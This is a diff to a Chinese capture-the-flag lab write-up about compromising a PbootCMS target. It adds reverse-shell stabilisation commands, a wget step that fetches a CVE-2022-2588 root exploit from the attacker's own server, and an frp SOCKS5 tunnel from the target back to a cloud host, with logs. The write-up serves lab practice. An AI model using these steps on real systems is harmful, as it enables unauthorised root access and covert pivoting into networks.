@@ -65,6 +65,17 @@ Cookie: lg=cn; PbootSystem=vs69gaa7if3h1s7hs3vq2beq8a
 Connection: close
 ```
 
+稳定shell
+```bash
+script /dev/null -c bash 
+Ctrl+Z 
+stty raw -echo; fg 
+reset xterm 
+export TERM=xterm 
+export SHELL=/bin/bash 
+stty rows 24 columns 80
+```
+
 反弹成功后进入系统，发现flag文件
 ```
 www-data@iZ8vbe81fu56hntkmf5cy5Z:/$ ls -l
@@ -82,7 +93,7 @@ flag{Php_Waf_so_insteresting!}
 ###  **flag{Php_Waf_so_insteresting!}**
 
 
-1. 可以使用 [# CVE-2022-2588]([CVE-2022-2588](https://github.com/Markakd/CVE-2022-2588)) 提权，靶机自带python,可以用阿里云的`python -m http.server 4444`上传
+1. 可以使用 [# CVE-2022-2588]([CVE-2022-2588](https://github.com/Markakd/CVE-2022-2588)) 提权，靶机自带python,可以用阿里云的`python -m http.server 4444`上传, 靶机执行`wget http://xxx.xxx.xxx.xxx:4444/exp_file_credential
 2. 记得`chmod 777 ./exp_file_credential` ，否则无法执行
 3. 这里不知道为啥第二次才执行成功，提权至root成功
 ```bash
@@ -202,6 +213,36 @@ start vulscan
 
 参考这篇 [靶机WP博客](https://h0ny.github.io/posts/%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92-Endless-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/)
 
-
 ![](assets/file-20260529165047140.png)
+
+## 搭建frp代理
+阿里云已经开放7000端口了，有防火墙还要再次执行`ufw allow 7000/tcp`
+
+### 阿里云服务端
+```bash
+ecs-user@iZuf6cpbx5hvqmv33pteu2Z /h/frp_0.65.0_linux_amd64> ./frps -c ./frps.toml
+2026-06-01 14:36:45.962 [I] [frps/root.go:108] frps uses config file: ./frps.toml
+2026-06-01 14:36:46.210 [I] [server/service.go:236] frps tcp listen on 0.0.0.0:7000
+2026-06-01 14:36:46.210 [I] [frps/root.go:117] frps started successfully
+2026-06-01 14:36:53.186 [I] [server/service.go:582] [5aee9f15ef905c3b] client login info: ip [39.101.143.209:46064] version [0.65.0] hostname [] os [linux] arch [amd64]
+2026-06-01 14:36:53.215 [I] [proxy/tcp.go:82] [5aee9f15ef905c3b] [plugin_socks5] tcp proxy listen port [6000]
+2026-06-01 14:36:53.215 [I] [server/control.go:399] [5aee9f15ef905c3b] new proxy [plugin_socks5] type [tcp] success
+```
+
+### 靶机端（PBOOTCMS）
+```bash
+www-data@iZ8vbgyjachs4g5pjgaopzZ:/tmp$ chmod 777 ./frpc
+www-data@iZ8vbgyjachs4g5pjgaopzZ:/tmp$ chmod 777 ./frpc.toml
+www-data@iZ8vbgyjachs4g5pjgaopzZ:/tmp$ ./frpc -c ./frpc.toml
+WARNING: ini format is deprecated and the support will be removed in the future, please use yaml/json/toml format instead!
+2026-06-01 14:36:53.111 [I] [sub/root.go:149] start frpc service for config file [./frpc.toml]
+2026-06-01 14:36:53.111 [I] [client/service.go:325] try to connect to server...
+2026-06-01 14:36:53.199 [I] [client/service.go:317] [5aee9f15ef905c3b] login to server success, get run id [5aee9f15ef905c3b]
+2026-06-01 14:36:53.199 [I] [proxy/proxy_manager.go:177] [5aee9f15ef905c3b] proxy added: [plugin_socks5]
+2026-06-01 14:36:53.228 [I] [client/control.go:172] [5aee9f15ef905c3b] [plugin_socks5] start proxy success
+```
+
+
+
 ![](assets/file-20260529165531264.png)
+
